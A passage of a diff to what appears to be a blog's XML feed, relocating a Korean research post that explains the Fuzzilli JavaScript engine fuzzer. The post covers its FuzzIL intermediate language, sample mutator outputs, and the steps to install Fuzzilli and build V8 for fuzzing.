class="hljs-comment">// arg1 = {&quot;x&quot;:42, &quot;y&quot;:43}</span>        <span class="hljs-keyword">let</span> arg2 = i <span class="hljs-comment">//arg2 = i</span>        b.callFunction(f, withArgs: [arg1, arg2]) <span class="hljs-comment">//f(arg1, arg2)</span>    }    <span class="hljs-keyword">return</span> b.finalize() <span class="hljs-comment">// &#xB9C8;&#xBB34;&#xB9AC;</span></code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; IL&#xB85C; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift">v0 &lt;- <span class="hljs-type">BeginPlainFunctionDefinition</span> -&gt; v1, v2    v3 &lt;- <span class="hljs-type">LoadProperty</span> v1, &apos;x&apos;    v4 &lt;- <span class="hljs-type">LoadProperty</span> v1, &apos;y&apos;    v5 &lt;- <span class="hljs-type">BinaryOperation</span> v3, &apos;+&apos;, v4    v6 &lt;- <span class="hljs-type">BinaryOperation</span> v5, &apos;*&apos;, v2    <span class="hljs-type">Return</span> v6<span class="hljs-type">EndPlainFunctionDefinition</span>v7 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">0</span>&apos;v8 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">1000</span>&apos;v9 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">1</span>&apos;<span class="hljs-type">BeginFor</span> v7, &apos;&lt;&apos;, v8, &apos;+&apos;, v9 -&gt; v10    v11 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">42</span>&apos;    v12 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">43</span>&apos;    v13 &lt;- <span class="hljs-type">CreateObject</span> [&apos;x&apos;:v11, &apos;y&apos;:v12]    v14 &lt;- <span class="hljs-type">CallFunction</span> v0, [v13, v10]<span class="hljs-type">EndFor</span></code></pre><p>&#xC774; IL&#xCF54;&#xB4DC;&#xB97C; javascript &#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift">function main() { <span class="hljs-comment">//v8 code prefix</span>function v0(v1,v2) {    const v3 = v1.x;    const v4 = v1.y;    const v5 = v3 + v4;    const v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) {    const v13 = {x:<span class="hljs-number">42</span>,y:<span class="hljs-number">43</span>};    const v14 = v0(v13,v10);}gc();                              <span class="hljs-comment">//</span>}                                  <span class="hljs-comment">//</span>%<span class="hljs-type">NeverOptimizeFunction</span>(main);      <span class="hljs-comment">// v8 code suffix</span>main();                            <span class="hljs-comment">//</span></code></pre><h2 id="Mutator"><a href="#Mutator" class="headerlink" title="Mutator"></a>Mutator</h2><h3 id="CodeGenMutator"><a href="#CodeGenMutator" class="headerlink" title="CodeGenMutator"></a>CodeGenMutator</h3><p>&#xAE30;&#xC874;&#xC758; &#xCF54;&#xB4DC;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; Mutation&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **v0 = v4;**        **<span class="hljs-keyword">const</span> v6 = [v0,v0,v1,v0];**        <span class="hljs-keyword">const</span> v7 = v5 * v2;        <span class="hljs-keyword">return</span> v7;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v11 = <span class="hljs-number">0</span>; v11 &lt; <span class="hljs-number">1000</span>; v11++) {        **<span class="hljs-keyword">let</span> v15 = <span class="hljs-built_in">Object</span>();        <span class="hljs-keyword">const</span> v16 = <span class="hljs-built_in">Object</span>;        <span class="hljs-keyword">const</span> v17 = v15--;**        <span class="hljs-keyword">const</span> v18 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v19 = v0(v18,v11);    }gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="InputMutator"><a href="#InputMutator" class="headerlink" title="InputMutator"></a>InputMutator</h3><p>random&#xC73C;&#xB85C; Input&#xC5D0; &#xB300;&#xD574; &#xACE8;&#xB77C;&#xC11C; &#xB2E4;&#xB978; input&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **<span class="hljs-keyword">const</span> v6 = v5 ^ v2;**        <span class="hljs-keyword">return</span> v6;    }    <span class="hljs-keyword">for</span> (**<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">9007199254740992</span>;** v10 &lt; <span class="hljs-number">1000</span>; v10++) {        <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    }    gc();    }%NeverOptimizeFunction(main);main();</code></pre><h3 id="OperationMutator"><a href="#OperationMutator" class="headerlink" title="OperationMutator"></a>OperationMutator</h3><p>Operation&#xC744; &#xD558;&#xB098; &#xACE8;&#xB77C;&#xC11C; mutate &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{    <span class="hljs-keyword">const</span> v3 = v1.x;    <span class="hljs-keyword">const</span> v4 = v1.y;    <span class="hljs-keyword">const</span> v5 = v3 + v4;    <span class="hljs-keyword">const</span> v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; **v10 = v10 &amp;&amp; <span class="hljs-number">1</span>**) {    <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">toString</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};    <span class="hljs-keyword">const</span> v14 = v0(v13,v10);}gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="CombineMutator"><a href="#CombineMutator" class="headerlink" title="CombineMutator"></a>CombineMutator</h3><p>corpus&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C; &#xC911; &#xD558;&#xB098;&#xB97C; &#xACE8;&#xB77C;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    }    **<span class="hljs-keyword">const</span> v11 = <span class="hljs-built_in">Object</span>();**    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v12 = <span class="hljs-number">0</span>; v12 &lt; <span class="hljs-number">1000</span>; v12++) {        <span class="hljs-keyword">const</span> v15 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v16 = v0(v15,v12);    }    gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="JITStressMutator"><a href="#JITStressMutator" class="headerlink" title="JITStressMutator"></a>JITStressMutator</h3><p>&#xC874;&#xC7AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) {        <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    }    **<span class="hljs-keyword">const</span> v15 = <span class="hljs-built_in">Object</span>;    <span class="hljs-keyword">const</span> v17 = v0(<span class="hljs-number">1000</span>,<span class="hljs-built_in">Object</span>);**    gc();}%NeverOptimizeFunction(main);main();</code></pre><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>Fuzzilli&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xC704;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; mutator &#xC678;&#xC5D0;&#xB3C4; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC0C8;&#xB85C;&#xC6B4; mutator&#xB97C; &#xB9CC;&#xB4E4;&#xAC70;&#xB098; &#xC0C8;&#xB85C;&#xC6B4; &#xC18D;&#xC131;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xBA74;&#xC11C; &#xD37C;&#xC800;&#xB97C; &#xAC1C;&#xC120;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xAE30;&#xC874;&#xC758; javascript &#xD30C;&#xC77C;&#xC744; FuzzIL&#xB85C; &#xBCC0;&#xD658;&#xD574; corpus&#xB97C; &#xAD6C;&#xC131;&#xD574;&#xC8FC;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xB97C; &#xC798; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xAC1C;&#xC120;&#xD55C;&#xB2E4;&#xBA74; js engine&#xC5D0; &#xB300;&#xD574; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Research</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>insu</tag>
+      
+      <tag>fuzzing</tag>
+      
+      <tag>system</tag>
+      
+      <tag>fuzzilli</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[하루한줄] CVE-2021-3409: QEMU Heap overflow in SDHCI</title>
     <link href="/2021/04/07/fabu1ous/2021-04-07/"/>
     <url>/2021/04/07/fabu1ous/2021-04-07/</url>
@@ -4647,37 +4678,6 @@
       <tag>qemu</tag>
       
       <tag>heap overflow</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>[Research] 자바스크립트 엔진 Fuzzer - Fuzzilli</title>
-    <link href="/2021/04/07/insu/fuzzilli/"/>
-    <url>/2021/04/07/insu/fuzzilli/</url>
-    
-    <content type="html"><![CDATA[<h1 id="Fuzzilli&#xB780;"><a href="#Fuzzilli&#xB780;" class="headerlink" title="Fuzzilli&#xB780;"></a>Fuzzilli&#xB780;</h1><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAE30;&#xC874;&#xC5D0; &#xC788;&#xB294; &#xBC29;&#xBC95;(&#xB79C;&#xB364;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xBC95; &#xB4F1;)&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C;&#xB294; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xD37C;&#xC9D5;&#xC744; &#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; sample&#xC744; &#xB9CC;&#xB4E4; &#xB54C; &#xBB38;&#xBC95;&#xC5D0; &#xB9DE;&#xB294; sample&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; <a href="https://github.com/googleprojectzero/domato">domato</a>&#xB77C;&#xB294; grammar-based &#xD37C;&#xC800;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. domato&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB8F0;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xC900; &#xB4A4; &#xADF8; &#xB8F0;&#xC5D0; &#xB530;&#xB77C; sample&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; domato&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled.png"></p><p><code>v4</code> &#xAC12;&#xC5D0; &#xB300;&#xD574; <code>slice</code>&#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xB54C; <code>slice</code>&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%201.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%202.png"></p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; try-catch &#xBB38;&#xC744; &#xD1B5;&#xD574; &#xC608;&#xC678; &#xCC98;&#xB9AC;&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xC608;&#xC678;&#xAC00; &#xC77C;&#xC5B4;&#xB098;&#xB3C4; &#xB2E4;&#xC74C; &#xBB38;&#xC7A5;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; JIT compiler&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xC774; &#xB418;&#xBA74; try-catch&#xBB38;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640;&#xB294; &#xC544;&#xC608; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xB192;&#xC740; &#xC218;&#xC900;&#xC758; Semantic correctness&#xB97C; &#xAC00;&#xC9C4; sample&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB294;&#xB370; Fuzzill&#xB294; mutation&#xC744; &#xD1B5;&#xD574; semantically valid&#xD55C; &#xC0D8;&#xD50C;&#xB9CC; corpus&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xC5D0;&#xC11C;&#xB294; FuzzIL&#xC774;&#xB77C;&#xB294; custom intermediate &#xC5B8;&#xC5B4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; mutation&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%203.png"></p><p>&#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; FuzzIL&#xC740; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; JS &#xCF54;&#xB4DC;&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%204.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%205.png"></p><p>FuzzIL&#xC5D0;&#xB294; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%206.png"></p><ul><li><p>Input Mutator - Input&#xC744; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p></li><li><p>Operation Mutator - Operation&#xC744; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p></li><li><p>Splice Mutator -  &#xB2E4;&#xB978; corpus&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC798;&#xB77C;&#xC640; &#xC0C8;&#xB85C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p></li><li><p>Insertion Mutator - &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>  &#xB4F1;&#xB4F1; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC774;&#xB7EC;&#xD55C; mutator&#xC640; &#xD568;&#xAED8; feedback&#xC744; &#xCD94;&#xAC00;&#xD574; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xB192;&#xC774;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%207.png"></p><h1 id="Fuzzilli-&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;"><a href="#Fuzzilli-&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;" class="headerlink" title="Fuzzilli &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;"></a>Fuzzilli &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;</h1><p>Ubuntu 20.04 LTS&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; clang&#xACFC; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xB4E4;&#xC744; &#xC124;&#xCE58;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">apt-get install clang clang++ libicu-dev</code></pre><p>&#xBC84;&#xC804;&#xC5D0; &#xB9DE;&#xB294; <a href="https://swift.org/download/">swift</a>&#xB97C; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><p>swift&#xB97C; &#xC124;&#xCE58; &#xD55C; &#xB4A4; PATH&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">wget https:<span class="hljs-comment">//swift.org/builds/swift-5.3.3-release/ubuntu2004/swift-5.3.3-RELEASE/swift-5.3.3-RELEASE-ubuntu20.04.tar.gz</span>mkdir ~/swifttar -xvf swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>.tar.gz -C ~/swift<span class="hljs-keyword">export</span> PATH=~<span class="hljs-regexp">/swift/</span>swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>/usr/bin/:$PATH</code></pre><p>git&#xC744; &#xC774;&#xC6A9;&#xD574; fuzzilli&#xB97C; &#xBC1B;&#xC544; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//github.com/googleprojectzero/fuzzilli.git</span>cd swiftswift build -c release</code></pre><p>&#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD0C0;&#xAE43; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, chromium&#xC758; v8&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; v8 source&#xB97C; &#xBC1B;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><span class="hljs-keyword">export</span> PATH=<span class="hljs-regexp">/path/</span>to/depot_tools:$PATHmkdir ~/v8cd ~/v8fetch v8cd v8/path/to/fuzzilli/Targets/V8/fuzzbuild.sh</code></pre><p>&#xC644;&#xB8CC;&#xD558;&#xBA74; v8/out/fuzzbuild/d8&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p>fuzzilli&#xC640; v8&#xC744; &#xBAA8;&#xB450; &#xBE4C;&#xB4DC;&#xD588;&#xC73C;&#xBA74; &#xB2E4;&#xC74C;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; fuzzilli&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">swift run FuzzilliCli --profile=v8 ~<span class="hljs-regexp">/Desktop/</span>v8/v8/out/fuzzbuild/d8</code></pre><p>&#xC2E4;&#xD589;&#xD560; &#xB54C; &#xC5EC;&#xB7EC; &#xC635;&#xC158;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xB370; &#xC790;&#xC138;&#xD55C; &#xC635;&#xC158;&#xC740; github&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzilli-&#xBD84;&#xC11D;"><a href="#Fuzzilli-&#xBD84;&#xC11D;" class="headerlink" title="Fuzzilli &#xBD84;&#xC11D;"></a>Fuzzilli &#xBD84;&#xC11D;</h1><p>&#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB294; FuzzilIL&#xC744; test &#xD558;&#xAE30; &#xC704;&#xD574; &#xB9CC;&#xB4DC;&#xB294; FuzzIL&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; FuzzIL&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; mutation &#xACB0;&#xACFC;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift"><span class="hljs-keyword">let</span> b = makeBuilder() <span class="hljs-comment">//IL&#xC744; &#xB2F4;&#xC744; ProgramBuilder &#xC0DD;&#xC131;.</span>    <span class="hljs-keyword">let</span> f = b.definePlainFunction(withSignature: <span class="hljs-type">FunctionSignature</span>(withParameterCount: <span class="hljs-number">2</span>)) { params <span class="hljs-keyword">in</span> <span class="hljs-comment">//&#xC778;&#xC790;&#xB97C; 2&#xAC1C; &#xBC1B;&#xB294; &#xD568;&#xC218; &#xC120;&#xC5B8;</span>        <span class="hljs-keyword">let</span> x = b.loadProperty(<span class="hljs-string">&quot;x&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; x property&#xB97C; &#xAC00;&#xC838;&#xC634;.</span>        <span class="hljs-keyword">let</span> y = b.loadProperty(<span class="hljs-string">&quot;y&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; y property&#xB97C; &#xAC00;&#xC838;&#xC634;.</span>        <span class="hljs-keyword">let</span> s = b.binary(x, y, with: .<span class="hljs-type">Add</span>) <span class="hljs-comment">// x&#xC640; y&#xC758; &#xAC12;&#xC744; &#xB354; &#xD568;.(&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; x,y &#xAC12;&#xC758; &#xD569;.)</span>        <span class="hljs-keyword">let</span> p = b.binary(s, params[<span class="hljs-number">1</span>], with: .<span class="hljs-type">Mul</span>) <span class="hljs-comment">// s&#xC758; &#xAC12;&#xACFC; &#xB450;&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; &#xACF1;&#xD568;.</span>        b.doReturn(value: p) <span class="hljs-comment">// p&#xC758; &#xAC12;&#xC744; &#xB9AC;&#xD134;.</span>    }    b.forLoop(b.loadInt(<span class="hljs-number">0</span>), .lessThan, b.loadInt(<span class="hljs-number">1000</span>), .<span class="hljs-type">Add</span>, b.loadInt(<span class="hljs-number">1</span>)) { i <span class="hljs-keyword">in</span> <span class="hljs-comment">// &#xBC18;&#xBCF5;&#xBB38; &#xC120;&#xC5B8;, for(i=0;i&lt;1000;i++)</span>        <span class="hljs-keyword">let</span> x = b.loadInt(<span class="hljs-number">42</span>) <span class="hljs-comment">// x = 42</span>        <span class="hljs-keyword">let</span> y = b.loadInt(<span class="hljs-number">43</span>) <span class="hljs-comment">// y = 43</span>        <span class="hljs-keyword">let</span> arg1 = b.createObject(with: [<span class="hljs-string">&quot;x&quot;</span>: x, <span class="hljs-string">&quot;y&quot;</span>: y]) <span class="hljs-comment">// arg1 = {&quot;x&quot;:42, &quot;y&quot;:43}</span>        <span class="hljs-keyword">let</span> arg2 = i <span class="hljs-comment">//arg2 = i</span>        b.callFunction(f, withArgs: [arg1, arg2]) <span class="hljs-comment">//f(arg1, arg2)</span>    }    <span class="hljs-keyword">return</span> b.finalize() <span class="hljs-comment">// &#xB9C8;&#xBB34;&#xB9AC;</span></code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; IL&#xB85C; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift">v0 &lt;- <span class="hljs-type">BeginPlainFunctionDefinition</span> -&gt; v1, 